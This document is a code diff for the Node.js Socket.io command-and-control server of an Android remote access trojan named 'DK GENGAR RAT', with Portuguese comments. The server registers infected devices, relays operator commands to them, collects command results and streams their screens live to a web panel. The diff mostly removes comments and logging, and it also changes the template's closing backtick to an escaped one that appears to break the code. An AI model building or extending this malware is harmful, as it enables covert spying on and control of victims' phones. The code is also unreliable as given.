@@ -243,7 +243,6 @@ const htmlContent = `
             }
         }
 
-        // Receber frames da tela
         socket.on('screen_frame', (data) => {
             if (isLive) {
                 const img = document.getElementById("live-img");
@@ -254,14 +253,12 @@ const htmlContent = `
             }
         });
 
-        // Receber logs do servidor
         socket.on('server_log', (msg) => {
             const log = document.getElementById("log-terminal");
             log.innerHTML += \`[\${new Date().toLocaleTimeString()}] <span style="color: #fff;">\${msg}</span><br>\`;
             log.scrollTop = log.scrollHeight;
         });
 
-        // Receber registro de novos dispositivos
         socket.on('new_device', (data) => {
             const list = document.getElementById("device-list");
             const log = document.getElementById("log-terminal");
@@ -275,45 +272,31 @@ const htmlContent = `
     </script>
 </body>
 </html>
-`;
+\`;
 
-// --- LÓGICA DO SERVIDOR ---
 app.get('/', (req, res) => {
     res.send(htmlContent);
 });
 
 io.on('connection', (socket) => {
-    console.log('Nova conexão Socket.io');
-
-    // Quando um APK se registra
     socket.on('register', (data) => {
-        console.log('Dispositivo registrado:', data.model);
         io.emit('new_device', data);
     });
 
-    // Quando o painel envia um comando
     socket.on('command', (data) => {
-        console.log('Comando enviado:', data.cmd);
         socket.broadcast.emit('command', data);
     });
 
-    // Quando o APK envia o resultado de um comando
     socket.on('result', (data) => {
-        console.log('Resultado recebido:', data.msg);
         io.emit('server_log', data.msg);
     });
 
-    // Quando o APK envia um frame de tela
     socket.on('screen_frame', (frame) => {
         io.emit('screen_frame', frame);
-    });
-
-    socket.on('disconnect', () => {
-        console.log('Conexão encerrada');
     });
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(\`Servidor DK GENGAR RAT rodando na porta \${PORT}\`);
+    console.log('Servidor DK GENGAR RAT rodando na porta ' + PORT);
 });
